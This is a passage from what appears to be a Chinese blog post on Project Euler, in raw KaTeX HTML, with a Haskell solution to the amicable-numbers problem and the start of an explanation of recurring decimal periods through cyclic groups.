xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span></span></span></span> 有：</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>σ</mi><mrow><mo fence="true">(</mo><mi>p</mi><mo fence="true">)</mo></mrow><mo>=</mo><mi>p</mi><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">\sigma \left( p \right) =p+1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal">p</span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span></span></p><p>对于质因子只有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span></span></span></span> 的数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>P</mi><mi>a</mi></msup></mrow><annotation encoding="application/x-tex">P^a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">a</span></span></span></span></span></span></span></span></span></span></span>有</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>σ</mi><mrow><mo fence="true">(</mo><msup><mi>p</mi><mi>a</mi></msup><mo fence="true">)</mo></mrow><mo>=</mo><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>0</mn></mrow><mi>a</mi></munderover><msup><mi>p</mi><mi>i</mi></msup><mo>=</mo><mfrac><mrow><msup><mi>p</mi><mrow><mi>a</mi><mo>+</mo><mn>1</mn></mrow></msup><mo>−</mo><mn>1</mn></mrow><mrow><mi>p</mi><mo>−</mo><mn>1</mn></mrow></mfrac></mrow><annotation encoding="application/x-tex">\sigma \left( p^a \right) =\sum_{i=0}^a{p^i}=\frac{p^{a+1}-1}{p-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7144em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">a</span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.9291em;vertical-align:-1.2777em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6514em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">0</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">a</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2777em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8747em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.3715em;vertical-align:-0.8804em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.4911em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.8804em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p><p>这是因为因子只能是几个 1 或者 p 的倍数。</p><p>考虑如果一个数有 2 个不同质因数 p 和 q 组成，分别由 a 和 b 个，那么质因数组成的方式是 p 选出若干个，q 选出若干个，实际上就是下面多项式相乘的方式</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mrow><mo fence="true">(</mo><mn>1</mn><mo>+</mo><mi>p</mi><mo>+</mo><mo>⋯</mo><msup><mi>p</mi><mi>a</mi></msup><mo fence="true">)</mo></mrow><mrow><mo fence="true">(</mo><mn>1</mn><mo>+</mo><mi>q</mi><mo>+</mo><mo>⋯</mo><msup><mi>q</mi><mi>b</mi></msup><mo fence="true">)</mo></mrow><mo>=</mo><mi>σ</mi><mrow><mo fence="true">(</mo><msup><mi>p</mi><mi>a</mi></msup><mo fence="true">)</mo></mrow><mi>σ</mi><mrow><mo fence="true">(</mo><msup><mi>q</mi><mi>b</mi></msup><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">\left( 1+p+\cdots p^a \right) \left( 1+q+\cdots q^b \right) =\sigma \left( p^a \right) \sigma \left( q^b \right)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.2491em;vertical-align:-0.35em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="minner">⋯</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7144em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">a</span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">(</span></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="minner">⋯</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">b</span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">)</span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.2491em;vertical-align:-0.35em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7144em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">a</span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">(</span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">b</span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">)</span></span></span></span></span></span></span></p><p>那么拓展到若干个不同质因数的情况，知道是乘起来啦。</p><p>下面代码中，关键在于求真因子的和，然后记忆化了这个和。</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">module</span> P21 (<span class="title">sumAcicable</span>, <span class="title">sumAcicable2</span>) <span class="keyword">where</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> Control.Monad.State</span><br><span class="line"><span class="keyword">import</span> Data.List (<span class="title">group</span>, <span class="title">nub</span>)</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">qualified</span> Data.Map <span class="keyword">as</span> Map</span><br><span class="line"></span><br><span class="line"><span class="comment">-- | Calculates the sum of amicable numbers under a given limit.</span></span><br><span class="line"><span class="title">sumAcicable</span> :: <span class="type">Int</span> -&gt; <span class="type">Int</span></span><br><span class="line"><span class="title">sumAcicable</span> num = sum $ acicable (num - <span class="number">1</span>)</span><br><span class="line">  <span class="keyword">where</span></span><br><span class="line">    <span class="comment">-- \| Generates a list of amicable numbers up to a given limit.</span></span><br><span class="line">    acicable n = [a | a &lt;- [<span class="number">2</span> .. n], <span class="keyword">let</span> b = sumDivisors a, a == sumDivisors b, a /= b]</span><br><span class="line"></span><br><span class="line">    <span class="comment">-- \| Calculates the sum of proper divisors of a number.</span></span><br><span class="line">    sumDivisors n = foldr (\(x, y) acc -&gt; acc + x + y) <span class="number">1</span> (factors n)</span><br><span class="line"></span><br><span class="line">    <span class="comment">-- \| Generates a list of factors of a number along with their complementary factors.</span></span><br><span class="line">    factors x = [(a, <span class="keyword">if</span> a * a == x <span class="keyword">then</span> <span class="number">0</span> <span class="keyword">else</span> x `div` a) | a &lt;- [<span class="number">2</span> .. (floor . sqrt $ fromIntegral x)], x `mod` a == <span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">-- | An alternative implementation using the State Monad for caching.</span></span><br><span class="line"><span class="title">sumAcicable2</span> :: <span class="type">Int</span> -&gt; <span class="type">Int</span></span><br><span class="line"><span class="title">sumAcicable2</span> num = evalState (acicable (num - <span class="number">1</span>)) <span class="type">Map</span>.empty</span><br><span class="line">  <span class="keyword">where</span></span><br><span class="line">    <span class="comment">-- \| Generates a list of prime numbers up to half the given limit.</span></span><br><span class="line">    primes = sieve [<span class="number">2</span> .. num `div` <span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment">-- \| Calculates the sum of amicable numbers using a State Monad for caching.</span></span><br><span class="line">    acicable :: <span class="type">Int</span> -&gt; <span class="type">State</span> (<span class="type">Map</span>.<span class="type">Map</span> <span class="type">Int</span> <span class="type">Int</span>) <span class="type">Int</span></span><br><span class="line">    acicable n = sum &lt;$&gt; mapM evaluateDivisors [<span class="number">2</span> .. n]</span><br><span class="line"></span><br><span class="line">    <span class="comment">-- \| Evaluates and returns an amicable number if conditions are met, using cached results.</span></span><br><span class="line">    evaluateDivisors :: <span class="type">Int</span> -&gt; <span class="type">State</span> (<span class="type">Map</span>.<span class="type">Map</span> <span class="type">Int</span> <span class="type">Int</span>) <span class="type">Int</span></span><br><span class="line">    evaluateDivisors a = <span class="keyword">do</span></span><br><span class="line">      b &lt;- sumDivisors a</span><br><span class="line">      bDivSum &lt;- sumDivisors b</span><br><span class="line">      <span class="keyword">if</span> bDivSum == a &amp;&amp; a /= b <span class="keyword">then</span> return a <span class="keyword">else</span> return <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">-- \| Computes the sum of divisors of a number, with caching.</span></span><br><span class="line">    sumDivisors :: <span class="type">Int</span> -&gt; <span class="type">State</span> (<span class="type">Map</span>.<span class="type">Map</span> <span class="type">Int</span> <span class="type">Int</span>) <span class="type">Int</span></span><br><span class="line">    sumDivisors n = <span class="keyword">do</span></span><br><span class="line">      cache &lt;- get</span><br><span class="line">      <span class="keyword">case</span> <span class="type">Map</span>.lookup n cache <span class="keyword">of</span></span><br><span class="line">        <span class="type">Just</span> s -&gt; return s</span><br><span class="line">        <span class="type">Nothing</span> -&gt; <span class="keyword">do</span></span><br><span class="line">          <span class="keyword">let</span> facs = primeFactors n primes</span><br><span class="line">              exponents = map length $ group facs</span><br><span class="line">              deltas = zipWith (\p a -&gt; (p ^ (a + <span class="number">1</span>) - <span class="number">1</span>) `div` (p - <span class="number">1</span>)) (nub facs) exponents</span><br><span class="line">              s = product deltas - n</span><br><span class="line">          modify (<span class="type">Map</span>.insert n s)</span><br><span class="line">          return s</span><br><span class="line"></span><br><span class="line">    <span class="comment">-- \| Generates the prime factors of a number.</span></span><br><span class="line">    primeFactors :: <span class="type">Int</span> -&gt; [<span class="type">Int</span>] -&gt; [<span class="type">Int</span>]</span><br><span class="line">    primeFactors <span class="number">1</span> _ = []</span><br><span class="line">    primeFactors _ [] = []</span><br><span class="line">    primeFactors m (p : ps)</span><br><span class="line">      | m `mod` p == <span class="number">0</span> = p : primeFactors (m `div` p) (p : ps)</span><br><span class="line">      | otherwise = primeFactors m ps</span><br><span class="line"></span><br><span class="line">    <span class="comment">-- \| Generates a list of prime numbers using the sieve method.</span></span><br><span class="line">    sieve :: [<span class="type">Int</span>] -&gt; [<span class="type">Int</span>]</span><br><span class="line">    sieve [] = []</span><br><span class="line">    sieve (p : xs) = p : sieve [x | x &lt;- xs, x `mod` p /= <span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">-- | Main function to print the sum of amicable numbers under 10000.</span></span><br><span class="line"><span class="title">main</span> = print $ sumAcicable2 <span class="number">10000</span></span><br></pre></td></tr></table></figure><h1>P26 小数循环节和循环群</h1><p><img src="https://cdn.blog-blockchain.xyz/2024/01/cd56c9ab47819ffe8a79fa857256a1ea.png" alt="image-20240122011802524"></p><h2 id="循环群的角度">循环群的角度</h2><h2 id="分母和-10-互质时">分母和 10 互质时</h2><p>做除法的过程，实际上是计算 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><msup><mn>0</mn><mi>k</mi></msup><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>n</mi></mrow><annotation encoding="application/x-tex">10^k \mod n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8491em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span></span></span></span> 的值的过程，这个值就是作为第 k 次除法的余数。当余数为 1 的时候，也即<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><msup><mn>0</mn><mi>k</mi></msup><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>n</mi><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">10^k \mod n=1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8491em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>， 说明就构成了循环。但是这不一定是第一次循环，因为余数可能在其他数字，比如 2 的时候，出现过 2 次，那么这个循环就要更短。</p><p>先考虑当 10 和 n 互质的时候，构成循环群<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">{</mo><mn>1</mn><msup><mn>0</mn><mi>k</mi></msup><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mi>n</mi><mi mathvariant="normal">∣</mi><mi>k</mi><mo>∈</mo><msup><mi mathvariant="double-struck">N</mi><mo>∗</mo></msup><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">\{10^k\mathrm{mod}n|k\in \mathbb{N} ^*\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0991em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathrm">mod</span></span><span class="mord mathnormal">n</span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathbb">N</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6887em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span><span class="mclose">}</span></span></span></span>，而且那么循环群的阶是最小使它余 1 的数，而且必然是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>φ</mi><mrow><mo fence="true">(</mo><mi>n</mi><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">\varphi \left( n \right)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal">n</span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span></span>的因子。显然如果<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>φ</mi><mrow><mo fence="true">(</mo><mi>n</mi><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">\varphi \left( n \right)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal">n</span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span></span>是质数，那么阶就是<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>φ</mi><mrow><mo fence="true">(</mo><mi>n</mi><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">\varphi \left( n \right)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal">n</span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span></span>。</p><p>这是因为群是闭合的，任意两个群元素的乘积仍然是群的元素。如果我们考虑 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>a</mi><mi>k</mi></msup><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>m</mi></mrow><annotation encoding="application/x-tex">a^k \mod m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8491em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">m</span></span></span></span> 的所有可能的幂，这个集合在模 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span> 的乘法下也是闭合的。那么如果 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">a</span></span></span></span> 生成了一个循环群，那么这个群的阶（即群中元素的个数）就是最小的正整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span>，使得 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>a</mi><mi>k</mi></msup><mo>≡</mo><mn>1</mn><mspace></mspace><mspace width="0.4444em"/><mo stretchy="false">(</mo><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mspace width="0.3333em"/><mi>m</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">a^k \equiv 1 \pmod{m}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8491em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.4444em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.3333em;"></span><span class="mord mathnormal">m</span><span class="mclose">)</span></span></span></span>。这个阶 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> 必须整除任何 <span class="katex"><span 